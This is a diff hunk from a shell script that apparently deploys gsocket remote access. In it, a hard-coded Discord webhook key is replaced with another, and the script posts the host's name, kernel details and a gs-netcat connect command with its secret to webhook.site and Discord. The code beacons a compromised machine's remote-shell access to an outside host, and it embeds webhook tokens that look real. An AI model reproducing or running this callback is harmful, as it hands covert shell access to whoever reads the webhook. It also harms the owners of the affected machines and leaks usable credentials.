@@ -102,7 +102,7 @@ msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
 	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
 }
 ### discord webhook
- GS_DISCORD_KEY="1146134786516197449/L6vBTb2cke-D6JP3sOss9WEXOz0RIxshmUUKQ1NCc0DvJkqekDyG7034g9H6hFijamdW"
+ GS_DISCORD_KEY="1182858729201356810/sFOwRj1J5xdK3yGtCNcc9MuQKibjmdDVymojdgokP8jzbETfunBVQGLgF28m5E6Nh3u_"
 [[ -n $GS_DISCORD_KEY ]] && {
 	data='{"username": "gsocket", "content": "'"${msg}"'"}'
 	GS_WEBHOOK_CURL=('-H' 'Content-Type: application/json' '-d' "${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
